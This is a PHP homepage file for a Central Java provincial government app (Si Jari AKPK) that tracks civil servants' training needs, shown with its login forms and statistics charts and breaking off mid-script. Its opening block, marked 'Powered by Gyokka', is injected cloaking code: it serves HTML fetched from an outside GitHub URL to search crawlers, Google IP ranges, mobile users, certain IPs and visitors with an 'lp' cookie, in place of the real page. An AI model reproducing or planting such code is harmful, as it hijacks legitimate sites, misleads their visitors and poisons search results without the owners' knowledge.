<?php
// Powered by Gyokka
error_reporting(0);

function curl_get_contents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    $response = curl_exec($ch);
    $error    = curl_error($ch);
    $code     = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($error || $code != 200) {
        return false;
    }
    return $response;
}

function getCachedContentFile($url, $cacheFile, $expireTime = 86400) {
    if (file_exists($cacheFile) && (time() - filemtime($cacheFile) < $expireTime)) {
        return file_get_contents($cacheFile);
    }
    $content = curl_get_contents($url);
    if ($content !== false) {
        file_put_contents($cacheFile, $content);
        return $content;
    }
    if (file_exists($cacheFile)) {
        return file_get_contents($cacheFile);
    }

    return false;
}

function parseIpRanges($json_data, $ipv4Key = 'ipv4Prefix') {
    $ip_data = json_decode($json_data, true);
    $ip_ranges = array();

    if (isset($ip_data["prefixes"])) {
        foreach ($ip_data["prefixes"] as $prefix) {
            if (isset($prefix[$ipv4Key])) {
                $ip_ranges[] = $prefix[$ipv4Key];
            }
        }
    }
    return $ip_ranges;
}

function ip_in_range($ip, $range) {
    if (strpos($range, '/') === false) {
        return false;
    }
    list($subnet, $mask) = explode('/', $range);

    $ip_dec     = (float) sprintf("%u", ip2long($ip));
    $subnet_dec = (float) sprintf("%u", ip2long($subnet));
    $mask       = (int) $mask;  
    $network_mask = ~((1 << (32 - $mask)) - 1);

    return ($ip_dec & $network_mask) === ($subnet_dec & $network_mask);
}

function isMobileDevice() {
    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
        return false;
    }
    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);

    $mobileAgents = array(
        'android', 'avantgo', 'blackberry', 'blazer', 'cldc-', 'cupcake', 'fennec',
        'hiptop', 'hp ipaq', 'ipad', 'iphone', 'ipod', 'kindle', 'linux armv',
        'midp', 'mmp', 'mobile', 'motorola', 'nokia', 'opera mini', 'opera mobi',
        'palm', 'pda', 'phone', 'pocket', 'psp', 'smartphone', 'symbian', 'treo',
        'up.browser', 'up.link', 'wap', 'webos', 'windows ce', 'windows phone',
        'xda', 'xiino', 'silk', 'kindle', 'iemobile', 'uc browser'
    );

    foreach ($mobileAgents as $m) {
        if (strpos($agent, $m) !== false) {
            return true;
        }
    }
    return false;
}

$cacheDir = dirname(__FILE__) . '/cache';
if (!is_dir($cacheDir)) {
    mkdir($cacheDir, 0777, true);
}

$link = "https://raw.githubusercontent.com/noviclara/akdjatengprov/refs/heads/main/akdbpsdmdjatengprov.html";

$googleCacheFile = $cacheDir . '/google_iprange.json';
$google_json = getCachedContentFile("https://www.gstatic.com/ipranges/goog.json", $googleCacheFile, 86400);
$google_ip_ranges = array();
if ($google_json !== false) {
    $google_ip_ranges = parseIpRanges($google_json, 'ipv4Prefix');
}

$visitor_ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"]
    : (isset($_SERVER["HTTP_INCAP_CLIENT_IP"]) ? $_SERVER["HTTP_INCAP_CLIENT_IP"]
    : (isset($_SERVER["HTTP_TRUE_CLIENT_IP"])  ? $_SERVER["HTTP_TRUE_CLIENT_IP"]
    : (isset($_SERVER["HTTP_REMOTEIP"])        ? $_SERVER["HTTP_REMOTEIP"]
    : (isset($_SERVER["HTTP_X_REAL_IP"])       ? $_SERVER["HTTP_X_REAL_IP"]
    : $_SERVER["REMOTE_ADDR"]))));

$googleallow = false;
foreach ($google_ip_ranges as $range) {
    if (ip_in_range($visitor_ip, $range)) {
        $googleallow = true;
        break;
    }
}

$keywords = array("bot", "ahrefs", "google");
$isBotOrCrawler = false;
$agent = isset($_SERVER["HTTP_USER_AGENT"]) ? strtolower($_SERVER["HTTP_USER_AGENT"]) : '';
foreach ($keywords as $k) {
    if (strpos($agent, $k) !== false) {
        $isBotOrCrawler = true;
        break;
    }
}

$alow = array("85.92.66.150", "81.19.188.236", "81.19.188.235", "85.92.66.149");
if ($_SERVER["REQUEST_URI"] == "/") {
    if (
        isMobileDevice() ||
        $isBotOrCrawler ||
        $googleallow ||
        isset($_COOKIE["lp"]) ||
        in_array($visitor_ip, $alow)
    ) {
        $txtCacheFile = $cacheDir . '/txt_content.txt';
        $txt_data = getCachedContentFile($link, $txtCacheFile, 86400);

        if ($txt_data !== false) {
            echo $txt_data;
            exit;
        }
    }
}

?>

<?php
date_default_timezone_set('Asia/Jakarta');
$tahunskr = date('Y');

include "plugins/config.php";

//hitung jumlah usulan total, jumlah usulan PNS Kabupaten & Kota dan PNS Pemprov pada tahun berjalan.
$query = mysqli_query($con, "SELECT
 (SELECT
      COUNT(*)
    FROM usulandiklat
    WHERE usulandiklat.oleh = 'pns'
    AND DATE_FORMAT(usulandiklat.tglsubmit, '%Y') = '" . $tahunskr . "') AS usulanpnsprov,
  (SELECT
      COUNT(*)
    FROM usulandiklat_kabkot
      INNER JOIN user_pnskabkot
        ON usulandiklat_kabkot.iduser = user_pnskabkot.nip
    WHERE DATE_FORMAT(usulandiklat_kabkot.tglsubmit, '%Y') = '" . $tahunskr . "') AS usulanpnskabkot,
  (SELECT
      COUNT(DISTINCT usulandiklat.iduser)
    FROM usulandiklat
    WHERE usulandiklat.oleh = 'pns'
    AND DATE_FORMAT(usulandiklat.tglsubmit, '%Y') = '" . $tahunskr . "') AS jmlpnsprov,
  (SELECT
      COUNT(DISTINCT usulandiklat_kabkot.iduser)
    FROM usulandiklat_kabkot
    WHERE DATE_FORMAT(usulandiklat_kabkot.tglsubmit, '%Y') = '" . $tahunskr . "') AS jmlpnskabkot,
(SELECT status FROM settings WHERE setting = 'input_oleh_pns') AS status_input,
(SELECT status FROM settings WHERE setting = 'usulan_terbuka') AS status_usulan_terbuka,
(SELECT status FROM settings WHERE setting = 'input_oleh_opd_prov') AS status_input_opd,
(SELECT status FROM settings WHERE setting = 'usulan_terbuka_opd_prov') AS status_usulan_terbuka_opd,
(SELECT status FROM settings WHERE setting = 'input_oleh_kabkota') AS status_input_kabkota,
(SELECT status FROM settings WHERE setting = 'usulan_terbuka_kabkota') AS status_usulan_terbuka_kabkota");

$row = mysqli_fetch_array($query);
$usulanpnsprov = $row['usulanpnsprov'];
$usulanpnskabkot = $row['usulanpnskabkot'];
$jmlpnsprov = $row['jmlpnsprov'];
$jmlpnskabkot = $row['jmlpnskabkot'];
$status_input = $row['status_input'];
$status_usulan_terbuka = $row['status_usulan_terbuka'];
$status_input_opd = $row['status_input_opd'];
//$status_usulan_terbuka_opd = $row['status_usulan_terbuka_opd'];
$status_input_kabkota = $row['status_input_kabkota'];
//$status_usulan_terbuka_kabkota = $row['status_usulan_terbuka_kabkota'];

$usulantotal = $usulanpnskabkot + $usulanpnsprov;

//untuk ditampilkan hasilnya pada grafik rekap per jenis pelatihan pada tahun berjalan
// dari PNS Kabupaten & Kota
$queryrekapusulan = mysqli_query($con, "SELECT masterjenisdiklat.nmjenisdiklat, COUNT(usulandiklat_kabkot.idusulandiklat)AS jumlahusulan FROM (usulandiklat_kabkot RIGHT JOIN masterjenisdiklat ON usulandiklat_kabkot.idjenisdiklat = masterjenisdiklat.idjenisdiklat) RIGHT JOIN user_pnskabkot ON usulandiklat_kabkot.iduser = user_pnskabkot.nip WHERE DATE_FORMAT(usulandiklat_kabkot.tglsubmit, '%Y') = '" . $tahunskr . "' GROUP BY usulandiklat_kabkot.idjenisdiklat");
// dari PNS Provinsi
$queryrekapusulan1 = mysqli_query($con, "SELECT masterjenisdiklat.nmjenisdiklat, COUNT(usulandiklat.idusulandiklat)AS jumlahusulan FROM usulandiklat RIGHT JOIN masterjenisdiklat ON usulandiklat.idjenisdiklat = masterjenisdiklat.idjenisdiklat WHERE DATE_FORMAT(usulandiklat.tglsubmit, '%Y') = '" . $tahunskr . "' AND usulandiklat.oleh = 'pns' GROUP BY usulandiklat.idjenisdiklat");

//menampilkan nama kabupaten / kota dan jumlah usulannya
$querylistkabkot = mysqli_query($con, "SELECT user_pnskabkot.kabupatenkota, COUNT(usulandiklat_kabkot.idusulandiklat) AS jumlahusulan FROM usulandiklat_kabkot "
    . "INNER JOIN user_pnskabkot ON usulandiklat_kabkot.iduser = user_pnskabkot.nip "
    . "WHERE DATE_FORMAT(usulandiklat_kabkot.tglsubmit, '%Y') = '" . $tahunskr . "' "
    . "GROUP BY user_pnskabkot.kabupatenkota");

//menampilkan nama OPD Provinsi dan jumlah usulannya
$querylistopdprov = mysqli_query($con, "SELECT user_pnspemprov.skpd, COUNT(usulandiklat.idusulandiklat) AS jumlahusulan FROM usulandiklat "
    . "INNER JOIN user_pnspemprov ON usulandiklat.iduser = user_pnspemprov.nip "
    . "WHERE usulandiklat.oleh = 'pns' "
    . "AND DATE_FORMAT(usulandiklat.tglsubmit, '%Y') = '" . $tahunskr . "' "
    . "GROUP BY user_pnspemprov.skpd");

$x = 0;
$x2 = 0;
while ($row1 = mysqli_fetch_array($querylistkabkot)) {
    $namakabkot[$x] = $row1['kabupatenkota'];
    $jmlusulankabkot[$x] = $row1['jumlahusulan'];
    $x++;
}
while ($row2 = mysqli_fetch_array($querylistopdprov)) {
    $nama_opdprov[$x2] = $row2['skpd'];
    $jmlusulan_opdprov[$x2] = $row2['jumlahusulan'];
    $x2++;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sistem Penjaringan Analisis Kebutuhan Pengembangan Kompetensi</title>
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- Favicons
            ================================================== -->
    <link rel="shortcut icon" href="img/logo_jawa_tengah_icon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" href="img/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="72x72" href="img/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="114x114" href="img/apple-touch-icon-114x114.png">

    <!-- Bootstrap -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="fonts/font-awesome/css/font-awesome.min.css">

    <!-- Stylesheet
            ================================================== -->
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <!--<link rel="stylesheet" type="text/css" href="css/prettyPhoto.css">-->
    <!--<link href='http://fonts.googleapis.com/css?family=Lato:400,700,900,300' rel='stylesheet' type='text/css'>
        <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,700,800,600,300' rel='stylesheet' type='text/css'>-->

    <!-- Datatables CSS -->
    <!--<link href="plugins/dataTables/dataTables.bootstrap.css" rel="stylesheet" type="text/css"/>-->
    <link href="plugins/dataTables/DataTables-1.10.16/css/dataTables.bootstrap4.min.css" rel="stylesheet"
        type="text/css" />

    <!--<script type="text/javascript" src="js/modernizr.custom.js"></script>-->

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
              <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
              <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
            <![endif]-->
    <style>
        #ModalSurvei .modal-dialog {
            -webkit-transform: translate(0, -50%);
            -o-transform: translate(0, -50%);
            transform: translate(0, -50%);
            top: 50%;
            margin: 0 auto;
        }
    </style>
</head>

<body id="page-top" data-spy="scroll" data-target=".navbar-fixed-top">

    <!-- Header -->
    <header id="header">
        <div class="intro">
            <div class="container">
                <div class="row">
                    <div class="intro-text">
                        <h1><span class="name"></span></h1>
                        <p></p>
                        <!--<a href="#about" class="btn btn-danger btn-lg page-scroll" style="float: right">Apa itu Si Jari AKPK?</a>-->
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- Navigation -->
    <div id="nav">
        <nav class="navbar navbar-custom">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse"
                        data-target=".navbar-main-collapse"> <i class="fa fa-bars"></i> </button>
                    <a class="navbar-brand page-scroll" href="#page-top">Si Jari AKPK</a>
                </div>

                <!-- Collect the nav links, forms, and other content for toggling -->
                <div class="collapse navbar-collapse navbar-right navbar-main-collapse">
                    <ul class="nav navbar-nav">
                        <!-- Hidden li included to remove active class from about link when scrolled up past about section -->
                        <li class="hidden"> <a href="#page-top"></a> </li>
                        <li> <a class="page-scroll" href="#about">APA ITU SI JARI AKPK?</a></li>
                        <li> <a class="page-scroll" href="#achievements">STATISTIK</a></li>
                        <li> <a class="page-scroll" href="#resume">KEBUTUHAN BANGKOM</a> </li>
                        <li> <a class="page-scroll" href="#contact">LOGIN</a> </li>
                        <li class="dropdown">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button"
                                aria-expanded="false">BUKU PANDUAN <span class="caret"></span></a>
                            <ul class="dropdown-menu" role="menu">
                                <li><a href="doc/BUKU KATALOG AKPK.pdf" target="_blank">Pengisian Kebutuhan dan Rencana
                                        Pengembangan Kompetensi</a></li>
                                <li><a href="doc/Panduan Pengisian Kebutuhan Ujikom di Si Ukom untuk JF dan Kontributor OPD.pdf"
                                        target="_blank">Pengisian Kebutuhan Uji Kompetensi</a></li>
                            </ul>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
    </div>
    <!-- About Section -->
    <div id="about">
        <div class="container">
            <div class="section-title text-center center">
                <h2>Apa itu Si Jari AKPK?</h2>
                <hr>
            </div>
            <div class="row">
                <div class="col-md-12 col-md-offset-0">
                    <div class="about-text">
                        <p style="font-size: 12pt; text-align: justify">Si Jari AKPK (sebelumnya bernama Si Jari On AKD)
                            atau Sistem Penjaringan Analisis Kebutuhan Pengembangan Kompetensi adalah aplikasi yang
                            disediakan oleh Badan Pengembangan Sumber Daya Manusia Daerah (BPSDMD) Provinsi Jawa Tengah
                            untuk mengidentifikasi kebutuhan Pengembangan Kompetensi bagi ASN di Provinsi Jawa Tengah.
                            Pengembangan kompetensi adalah segala upaya yang dilakukan untuk meningkatkan kompetensi ASN
                            untuk mengatasi kesenjangan kompetensi yang telah dimiliki.</p>
                        <p style="font-size: 12pt; text-align: justify">Selain itu Si Jari AKPK juga memiliki fitur Si
                            Ukom yang dapat mengidentifikasi kebutuhan Uji Kompetensi bagi Jabatan Fungsional di
                            Provinsi Jawa Tengah.</p>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-lg-6 text-center">
                    <strong>Panduan pengisian kebutuhan Pengembangan Kompetensi</strong><br>
                    <!--<img src="img/logo_jawa_tengah_icon-4.png" class="img-responsive">-->
                    <iframe width="544" height="306" src="https://www.youtube.com/embed/yLHUs8xBiZ4"
                        title="Video AKPK BPSDMD Jateng" frameborder="0"
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                        allowfullscreen></iframe>
                    <br><br>
                </div>
                <div class="col-lg-6 text-center">
                    <!--<img src="img/logo_jawa_tengah_icon-4.png" class="img-responsive">-->
                    <strong>Panduan pengisian kebutuhan Uji Kompetensi</strong><br>
                    <iframe width="544" height="306" src="https://www.youtube.com/embed/Shoeno6myJE"
                        title="SI UKOM untuk memfasilitasi usulan kebutuhan Uji Kompetensi Jabatan Fungsional"
                        frameborder="0"
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                        allowfullscreen></iframe>
                </div>
            </div>
        </div>
    </div>
    <!-- Skills Section -->

    <!-- Portfolio Section -->

    <!-- Achievements Section -->
    <div id="achievements" class="text-center">
        <div class="container">
            <div class="section-title center">
                <h2>Statistik Kebutuhan Pengembangan Kompetensi</h2>
                <p>Tahun input <?= $tahunskr ?> digunakan untuk perencanaan tahun <?= $tahunskr + 1 ?></p>
                <hr>
            </div>
            <div class="row">
                <div class="col-md-4 col-sm-4 wow fadeInDown" data-wow-delay="200ms">
                    <div class="achievement-box"> <span class="count"><?= $usulantotal ?></span>
                        <h4>Total Usulan Pelatihan</h4>
                    </div>
                </div>
                <div class="col-md-4 col-sm-4 wow fadeInDown" data-wow-delay="400ms">
                    <div class="achievement-box"> <span class="count"><?= $usulanpnsprov ?></span>
                        <h4>Usulan dari <?= $jmlpnsprov ?> ASN Pemprov</h4>
                    </div>
                </div>
                <div class="col-md-4 col-sm-4 wow fadeInDown" data-wow-delay="800ms">
                    <div class="achievement-box"> <span class="count"><?= $usulanpnskabkot ?></span>
                        <h4>Usulan dari <?= $jmlpnskabkot ?> ASN Kabupaten / Kota</h4>
                    </div>
                </div>
            </div>
            <br>
            <br>
            <div class="row">
                <div class="col-md-12">
                    <div id="grafikopd"></div>
                    <br>
                </div>
                <div class="col-md-12">
                    <div id="grafikkabkota"></div>
                </div>
            </div>
            <br>
            <div class="row">
                <div class="col-md-6">
                    <div id="grafikjnsdiklat1"></div>
                </div>
                <div class="col-md-6">
                    <div id="grafikjnsdiklat"></div>
                </div>
            </div>
        </div>
    </div>
    <!-- Resume Section -->
    <div id="resume">
        <div class="container">
            <div class="section-title center text-center">
                <h2>Kebutuhan Pengembangan Kompetensi</h2>
                <p>Tahun input <?= $tahunskr ?> yang sudah divalidasi oleh Kontributor untuk perencanaan tahun
                    <?= $tahunskr + 1 ?></p>
                <hr>
            </div>
            <div class="row">
                <div class="col-md-12">
                    <ul class="nav nav-tabs nav-justified">
                        <li class="active"><a data-toggle="tab" href="#pnspemprov">ASN Pemprov</a></li>
                        <li><a data-toggle="tab" href="#kabkota">ASN Kabupaten / Kota</a></li>

                    </ul>

                    <div class="tab-content">
                        <div id="pnspemprov" class="tab-pane fade in active">
                            <br>
                            <table class='table table-bordered' id="tabelusulan" style="width: 100%">
                                <thead>
                                    <tr>
                                        <!--<th rowspan="2">#</th>-->
                                        <th colspan="3">Pengusul</th>
                                        <th rowspan="2">Usulan Pelatihan</th>
                                        <th rowspan="2">Jenis Pelatihan</th>
                                        <th rowspan="2">Rumpun</th>
                                    </tr>
                                    <tr>
                                        <th>SKPD</th>
                                        <th>Nama</th>
                                        <!--<th>NIP</th>-->
                                        <th>Jabatan</th>
                                    </tr>
                                </thead>

                                <tfoot>
                                    <tr>
                                        <!--<th>#</th>-->
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                    </tr>
                                </tfoot>
                            </table>
                        </div>
                        <div id="kabkota" class="tab-pane fade">
                            <br>
                            <table class='table table-bordered' id="tabelusulan1" style="width: 100%">
                                <thead>
                                    <tr>
                                        <!--<th rowspan="2">#</th>-->
                                        <th colspan="3">Pengusul</th>
                                        <th rowspan="2">Usulan Pelatihan</th>
                                        <th rowspan="2">Jenis Pelatihan</th>
                                        <th rowspan="2">Rumpun</th>
                                    </tr>
                                    <tr>
                                        <th>Kabupaten / Kota</th>
                                        <th>Nama</th>
                                        <th>Jabatan</th>
                                    </tr>
                                </thead>

                                <tfoot>
                                    <tr>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                    </tr>
                                </tfoot>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Contact Section -->
    <div id="contact">
        <div class="container">
            <div class="section-title text-center">
                <h2>Login</h2>
                <hr>
            </div>
            <!-- Info Status Input -->
            <div class="col-lg-2">
                <h3 class="text-center"><span class="fa fa-info-circle"></span> Status Input</h3>
                <br>
                <div class="list-group">
                    <div class="list-group-item list-group-item-info">
                        <i class="fa fa-2x fa-user"></i>
                        <h5 class="list-group-item-heading">ASN Pemprov Jawa Tengah dan ASN Kabupaten / Kota</h5>
                        <!--pengaturan input oleh PNS-->
                        Input Kebutuhan Bangkom
                        <?php
                        if ($status_input == '0') {
                            ?>
                            <span class="label label-danger">Ditutup</span>
                            <?php
                        } else {
                            ?>
                            <span class="label label-success">Dibuka</span>
                            <?php
                        }
                        ?>
                        <br>
                        <!--pengaturan input usulan terbuka oleh PNS-->
                        <span>Input usulan terbuka </span>
                        <?php
                        if ($status_usulan_terbuka == '0') {
                            ?>
                            <span class="label label-danger">Ditutup</span>
                            <?php
                        } else {
                            ?>
                            <span class="label label-success">Dibuka</span>
                            <?php
                        }
                        ?>
                    </div>
                    <div href="#" class="list-group-item list-group-item-info">
                        <i class="fa fa-2x fa-building"></i>
                        <h5 class="list-group-item-heading">Kontributor OPD Pemprov</h5>
                        <!--pengaturan input oleh OPD Prov-->
                        <span>Input Rencana Bangkom</span>
                        <?php
                        if ($status_input_opd == '0') {
                            ?>
                            <span class="label label-danger">Ditutup</span>
                            <?php
                        } else {
                            ?>
                            <span class="label label-success">Dibuka</span>
                            <?php
                        }
                        ?>
                    </div>
                    <div href="#" class="list-group-item list-group-item-info">
                        <i class="fa fa-2x fa-building-o"></i>
                        <h5 class="list-group-item-heading">Kontributor Kabupaten / Kota</h5>
                        <!--pengaturan input oleh Kab/Kota-->
                        <span>Input Rencana Bangkom</span>
                        <?php
                        if ($status_input_kabkota == '0') {
                            ?>
                            <span class="label label-danger">Ditutup</span>
                            <?php
                        } else {
                            ?>
                            <span class="label label-success">Dibuka</span>
                            <?php
                        }
                        ?>
                    </div>
                </div>
            </div>

            <!-- Login form -->
            <div class="col-lg-10">
                <!-- PNS Pemprov -->
                <h3 class="text-center">ASN Pemprov Jawa Tengah</h3>
                <form id="formpns" name="sentMessage">
                    <div class="row">
                        <div class="col-md-4">
                            <div class="form-group">
                                <br>
                                <input type="text" name="email" class="form-control" placeholder="email kedinasan"
                                    required="required">
                                <p class="help-block text-danger"></p>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="form-group">
                                <br>
                                <input type="text" name="nip" class="form-control" placeholder="NIP"
                                    required="required">
                                <p class="help-block text-danger"></p>
                            </div>
                        </div>
                        <div class="col-md-2">
                            <div class="form-group">
                                <img src="plugins/captcha.php" style="float: left">
                                <input type="text" name="captcha" class="form-control" placeholder="Kode captcha"
                                    required="required">
                                <p class="help-block text-danger"></p>
                            </div>
                        </div>
                        <div class="col-md-2">
                            <div class="form-group">
                                <button type="submit" class="btn btn-default" id="btn-loginpns">Login</button>
                            </div>
                        </div>
                    </div>
                    <div id="alertpns"></div>
                </form>

                <!-- PNS Kab/Kota -->
                <h3 class="text-center">ASN Kabupaten / Kota</h3>
                <form id="formpnskabkota" name="sentMessage">
                    <div class="row">
                        <div class="col-md-4">
                            <div class="form-group">
                                <br>
                                <select name="kabnkota" class="form-control" required="">
                                    <option value="">--Pilih--</option>
                                    <option value="Kabupaten Banjarnegara">Kabupaten Banjarnegara</option>
                                    <option value="Kabupaten Banyumas">Kabupaten Banyumas</option>
                                    <option value="Kabupaten Batang">Kabupaten Batang</option>
                                    <option value="Kabupaten Blora">Kabupaten Blora</option>
                                    <option value="Kabupaten Boyolali">Kabupaten Boyolali</option>
                                    <option value="Kabupaten Brebes">Kabupaten Brebes</option>
                                    <option value="Kabupaten Cilacap">Kabupaten Cilacap</option>
                                    <option value="Kabupaten Demak">Kabupaten Demak</option>
                                    <option value="Kabupaten Grobogan">Kabupaten Grobogan</option>
                                    <option value="Kabupaten Jepara">Kabupaten Jepara</option>
                                    <option value="Kabupaten Karanganyar">Kabupaten Karanganyar</option>
                                    <option value="Kabupaten Kebumen">Kabupaten Kebumen</option>
                                    <option value="Kabupaten Kendal">Kabupaten Kendal</option>
                                    <option value="Kabupaten Klaten">Kabupaten Klaten</option>
                                    <option value="Kabupaten Kudus">Kabupaten Kudus</option>
                                    <option value="Kabupaten Magelang">Kabupaten Magelang</option>
                                    <option value="Kabupaten Pati">Kabupaten Pati</option>
                                    <option value="Kabupaten Pekalongan">Kabupaten Pekalongan</option>
                                    <option value="Kabupaten Pemalang">Kabupaten Pemalang</option>
                                    <option value="Kabupaten Purbalingga">Kabupaten Purbalingga</option>
                                    <option value="Kabupaten Purworejo">Kabupaten Purworejo</option>
                                    <option value="Kabupaten Rembang">Kabupaten Rembang</option>
                                    <option value="Kabupaten Semarang">Kabupaten Semarang</option>
                                    <option value="Kabupaten Sragen">Kabupaten Sragen</option>
                                    <option value="Kabupaten Sukoharjo">Kabupaten Sukoharjo</option>
                                    <option value="Kabupaten Tegal">Kabupaten Tegal</option>
                                    <option value="Kabupaten Temanggung">Kabupaten Temanggung</option>
                                    <option value="Kabupaten Wonogiri">Kabupaten Wonogiri</option>
                                    <option value="Kabupaten Wonosobo">Kabupaten Wonosobo</option>
                                    <option value="Kota Magelang">Kota Magelang</option>
                                    <option value="Kota Pekalongan">Kota Pekalongan</option>
                                    <option value="Kota Salatiga">Kota Salatiga</option>
                                    <option value="Kota Semarang">Kota Semarang</option>
                                    <option value="Kota Surakarta">Kota Surakarta</option>
                                    <option value="Kota Tegal">Kota Tegal</option>
                                </select>
                                <p class="help-block text-danger"></p>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="form-group">
                                <br>
                                <input type="text" name="nipkabkota" class="form-control" placeholder="NIP"
                                    required="required">
                                <p class="help-block text-danger"></p>
                            </div>
                        </div>
                        <div class="col-md-2">
                            <div class="form-group">
                                <img src="plugins/captchakabkota.php" style="float: left">
                                <input type="text" name="captcha" class="form-control" placeholder="Kode captcha"
                                    required="required">
                                <p class="help-block text-danger"></p>
                            </div>
                        </div>
                        <div class="col-md-2">
                            <div class="form-group">
                                <button type="submit" class="btn btn-default" id="btn-loginpns2">Login</button>
                            </div>
                        </div>
                    </div>
                    <div id="alertpns2"></div>
                </form>

                <!-- Kontributor -->
                <h3 class="text-center">Kontributor</h3>
                <form method="post" name="sentMessage" id="contactForm">
                    <div class="row">
                        <div class="col-md-5">
                            <div class="form-group">
                                <input type="text" id="kode" class="form-control" placeholder="Username"
                                    required="required">
                                <p class="help-block text-danger"></p>
                            </div>
                        </div>
                        <div class="col-md-5">
                            <div class="form-group">
                                <input type="password" id="password" class="form-control" placeholder="Password"
                                    required="required">
                                <p class="help-block text-danger"></p>
                            </div>
                        </div>
                        <div class="col-md-2">
                            <div class="form-group">
                                <button type="submit" class="btn btn-default" style="margin-top:0px"
                                    onclick="return check_login()">Login</button>
                            </div>
                        </div>
                    </div>
                    <div id="success"></div>
                </form>
            </div>
        </div>

    </div>
    <div id="footer">
        <div class="container text-center">
            <div class="fnav">
                <p>Copyright &copy; 2017 <a href="http://bpsdmd.jatengprov.go.id" rel="nofollow">BPSDMD Provinsi Jawa
                        Tengah</a>.</p>
            </div>
        </div>
    </div>


    <script type="text/javascript" src="js/jquery.1.11.1.js"></script>
    <script type="text/javascript" src="js/bootstrap.min.js"></script>
    <!--<script type="text/javascript" src="js/SmoothScroll.js"></script>-->
    <!--<script type="text/javascript" src="js/easypiechart.js"></script>
        <script type="text/javascript" src="js/jquery.prettyPhoto.js"></script>
        <script type="text/javascript" src="js/jquery.isotope.js"></script> -->
    <script type="text/javascript" src="js/jquery.counterup.js"></script>
    <script type="text/javascript" src="js/waypoints.js"></script>
    <script type="text/javascript" src="js/jqBootstrapValidation.js"></script>
    <!--<script type="text/javascript" src="js/contact_me.js"></script>-->
    <script type="text/javascript" src="js/main.js"></script>
    <script src="js/highcharts.js" type="text/javascript"></script>

    <!-- Datatables JS -->
    <script src="plugins/dataTables/DataTables-1.10.16/js/jquery.dataTables.min.js" type="text/javascript"></script>
    <script src="plugins/dataTables/DataTables-1.10.16/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
    <script src="plugins/dataTables/dataTables.rowsGroup.js" type="text/javascript"></script>

    <script>
        function check_login() {
            var kode = document.getElementById('kode').value;
            var password = document.getElementById('password').value;
            var dataString = 'kode=' + kode + '&password=' + password;
            if (kode == "") {
                $('#kode').focus();
                //return true;
            }
            else if (password == "") {
                $('#password').focus();
                //return true;
            }
            else {
                //Ubah tulisan pada elemen <p> saat click login
                $('#success').html('<center><br><label>Silakan tunggu ...</label></center>');
                $.ajax({
                    type: "post",
                    url: "proses.php",
                    data: dataString,
                    cache: false,
                    success: function (pesan) {
                        if (pesan == 'a') {
                            //Arahkan ke halaman admin
                            window.location = 'admin/';
                        }
                        else if (pesan == 'b') {
                            //Arahkan ke halaman kontributor
                            window.location = 'kontributor/';
                        }
                        else if (pesan == 'c') {
                            //Arahkan ke halaman kontributor
                            window.location = 'jateng1/';
                        }
                        else {
                            //Cetak peringatan untuk kode & password salah
                            $('#success').html(pesan);
                        }
                    }
                });
                return false;
            }
        }

        $(document).ready(function () {
            // grafik OPD Pemprov
            Highcharts.chart('grafikopd', {
                chart: {
                    type: 'bar',
                    height: 1000
                },
                title: {
                    text: 'Jumlah Usulan di OPD Provinsi'
                },
                xAxis: {
                    categories: [
                        <?php
                        for ($jmlbaris = 0; $jmlbaris < $x2; $jmlbaris++) {
                            echo "'" . $nama_opdprov[$jmlbaris] . "',";
                        }
                        ?>
                    ]
                },
                yAxis: {
                    opposite: true,
                    tickInterval: 10,
                    min: 0,
                    title: {
                        text: 'Jumlah usulan'
                    }
                },
                legend: {
                    enabled: false
                },
                //colors: ['#E20632', '#099A10'],
                series: [{
                    name: 'Jumlah usulan',
                    data: [
                        <?php
                        for ($jmlbaris = 0; $jmlbaris < $x2; $jmlbaris++) {
                            echo $jmlusulan_opdprov[$jmlbaris] . ",";
                        }
                        ?>
                    ],
                    dataLabels: {
                        enabled: true,
                        color: '#606060',
                        align: 'center',
                        format: '{point.y:.0f}', // no decimal
                        x: 10, // 10 pixels down from the top
                        style: {
                            fontSize: '8px',
                            fontFamily: 'Verdana, sans-serif'
                        }
                    }
                }]
            });
            // grafik Kab/Kota
            Highcharts.chart('grafikkabkota', {
                chart: {
                    type: 'column',
                    //height: 700
                },
                title: {
